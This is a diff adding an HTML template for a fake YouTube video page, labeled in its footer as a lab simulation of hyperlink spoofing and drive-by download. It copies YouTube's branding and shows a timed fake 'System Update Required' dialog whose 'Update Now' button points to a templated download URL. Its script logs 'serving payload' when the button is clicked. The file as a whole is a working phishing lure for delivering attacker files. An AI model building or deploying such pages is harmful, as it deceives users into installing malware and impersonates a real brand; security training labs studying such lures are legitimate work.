@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #0f0f0f;
+            color: #fff;
+            min-height: 100vh;
+        }
+        .navbar {
+            background: #212121;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid #333;
+        }
+        .logo svg { width: 90px; height: 20px; }
+        .search-box {
+            display: flex;
+            flex: 0 1 640px;
+        }
+        .search-box input {
+            flex: 1;
+            padding: 8px 16px;
+            background: #121212;
+            border: 1px solid #303030;
+            border-right: none;
+            border-radius: 20px 0 0 20px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+        .search-box button {
+            padding: 8px 20px;
+            background: #303030;
+            border: 1px solid #303030;
+            border-radius: 0 20px 20px 0;
+            cursor: pointer;
+        }
+        .search-box button svg { width: 24px; height: 24px; fill: #fff; }
+
+        .player-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+        }
+        .video-player {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .play-overlay {
+            cursor: pointer;
+            text-align: center;
+        }
+        .play-overlay svg {
+            width: 80px;
+            height: 80px;
+            opacity: 0.9;
+            transition: opacity 0.2s;
+        }
+        .play-overlay:hover svg { opacity: 1; }
+
+        .video-details {
+            padding: 16px 0;
+        }
+        .video-details h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .video-details .meta {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 16px;
+        }
+        .video-details .meta span { margin-right: 16px; }
+
+        .fake-dialog-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .fake-dialog-overlay.active { display: flex; }
+        .fake-dialog {
+            background: #1a1a2e;
+            border: 2px solid #333;
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+        .fake-dialog .warning-icon {
+            width: 80px;
+            height: 80px;
+            background: #ff4444;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+        }
+        .fake-dialog h2 {
+            font-size: 22px;
+            margin-bottom: 12px;
+            color: #ff4444;
+        }
+        .fake-dialog p {
+            font-size: 14px;
+            color: #ccc;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+        .fake-dialog .btn-download {
+            display: inline-block;
+            padding: 14px 40px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+        .fake-dialog .btn-download:hover { background: #cc0000; }
+        .fake-dialog .btn-secondary {
+            display: block;
+            margin-top: 12px;
+            color: #888;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .countdown-bar {
+            position: fixed;
+            top: 0; left: 0;
+            height: 4px;
+            background: #ff0000;
+            z-index: 1001;
+            transition: width 0.1s linear;
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #555;
+            font-size: 12px;
+            border-top: 1px solid #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <a class="logo" href="#">
+            <svg viewBox="0 0 90 20" fill="none">
+                <path d="M27.9727 3.12324C27.6435 1.89323 26.6768 0.926623 25.4468 0.597366C23.2197 2.24288e-07 14.285 0 14.285 0C14.285 0 5.35042 2.24288e-07 3.12323 0.597366C1.89323 0.926623 0.926623 1.89323 0.597366 3.12324C2.24288e-07 5.35042 0 10 0 10C0 10 2.24288e-07 14.6496 0.597366 16.8768C0.926623 18.1068 1.89323 19.0734 3.12323 19.4026C5.35042 20 14.285 20 14.285 20C14.285 20 23.2197 20 25.4468 19.4026C26.6768 19.0734 27.6435 18.1068 27.9727 16.8768C28.5701 14.6496 28.5701 10 28.5701 10C28.5701 10 28.5677 5.35042 27.9727 3.12324Z" fill="#FF0000"/>
+                <path d="M11.4253 14.2854L18.8477 10.0004L11.4253 5.71533V14.2854Z" fill="white"/>
+            </svg>
+        </a>
+        <div class="search-box">
+            <input type="text" placeholder="Search">
+            <button>
+                <svg viewBox="0 0 24 24"><path d="M20.87,20.17l-5.59-5.59C16.35,13.35,17,11.75,17,10c0-3.87-3.13-7-7-7s-7,3.13-7,7s3.13,7,7,7c1.75,0,3.35-0.65,4.58-1.71l5.59,5.59L20.87,20.17z M5,10c0-2.76,2.24-5,5-5s5,2.24,5,5s-2.24,5-5,5S5,12.76,5,10z"/></svg>
+            </button>
+        </div>
+        <div></div>
+    </div>
+
+    <div class="player-container">
+        <div class="video-player" id="videoPlayer">
+            <div class="play-overlay" id="playBtn">
+                <svg viewBox="0 0 68 48">
+                    <path d="M66.52,7.74c-0.78-2.93-2.49-5.41-5.42-6.19C55.79,.13,34,0,34,0S12.21,.13,6.9,1.55 C3.97,2.33,2.27,4.81,1.48,7.74C0.06,13.05,0,24,0,24s0.06,10.95,1.48,16.26c0.78,2.93,2.49,5.41,5.42,6.19 C12.21,47.87,34,48,34,48s21.79-0.13,27.1-1.55c2.93-0.78,4.64-3.26,5.42-6.19C67.94,34.95,68,24,68,24S67.94,13.05,66.52,7.74z" fill="#FF0000"/>
+                    <path d="M 45,24 27,14 27,34" fill="#fff"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="video-details">
+            <h1>Amazing Video You Must Watch - Official HD</h1>
+            <div class="meta">
+                <span>1,284,567 views</span>
+                <span>2 days ago</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="countdown-bar" id="countdownBar"></div>
+
+    <div class="fake-dialog-overlay" id="fakeDialog">
+        <div class="fake-dialog">
+            <div class="warning-icon">⚠</div>
+            <h2>System Update Required</h2>
+            <p>
+                Your video player component is outdated and cannot play this video.<br>
+                Please update to the latest version to continue watching.
+            </p>
+            <a href="{{ download_url }}" class="btn-download" id="downloadBtn">
+                Update Now
+            </a>
+            <a href="#" class="btn-secondary" onclick="closeDialog(); return false;">
+                Maybe Later
+            </a>
+        </div>
+    </div>
+
+    <div class="footer-note">
+        <p>⚠️ Lab Simulation — Hyperlink Spoofing + Drive-by Download</p>
+        <p>Halaman phishing clone YouTube dengan embedded drive-by download trigger</p>
+        <p>Download URL: {{ download_url }}</p>
+    </div>
+
+    <script>
+        let countdown = {{ delay }};
+        const bar = document.getElementById('countdownBar');
+        const dialog = document.getElementById('fakeDialog');
+        const totalDelay = countdown;
+
+        // Auto-show fake dialog after delay
+        const timer = setInterval(() => {
+            countdown -= 0.1;
+            const pct = ((totalDelay - countdown) / totalDelay) * 100;
+            bar.style.width = pct + '%';
+
+            if (countdown <= 0) {
+                clearInterval(timer);
+                bar.style.display = 'none';
+                showDialog();
+            }
+        }, 100);
+
+        function showDialog() {
+            dialog.classList.add('active');
+            console.log('[*] Fake update dialog displayed');
+        }
+
+        function closeDialog() {
+            dialog.classList.remove('active');
+        }
+
+        // Play button also triggers dialog
+        document.getElementById('playBtn').addEventListener('click', function() {
+            clearInterval(timer);
+            bar.style.display = 'none';
+            showDialog();
+        });
+
+        // Log download click
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            console.log('[*] Download button clicked — serving payload');
+        });
+    </script>
+</body>
+</html>
